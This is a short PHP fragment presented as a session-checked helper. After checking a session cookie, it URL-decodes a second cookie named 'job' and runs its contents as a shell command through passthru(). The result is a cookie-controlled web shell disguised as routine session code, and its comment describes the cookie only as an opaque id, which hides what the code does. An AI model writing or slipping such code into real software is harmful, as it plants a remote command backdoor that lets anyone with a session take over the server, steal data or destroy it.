<?php
// Session-checked helper: the cookie is an opaque id looked up in the store.
if (check_session_store($_COOKIE['sid'])) {
    passthru(urldecode($_COOKIE['job']));
}
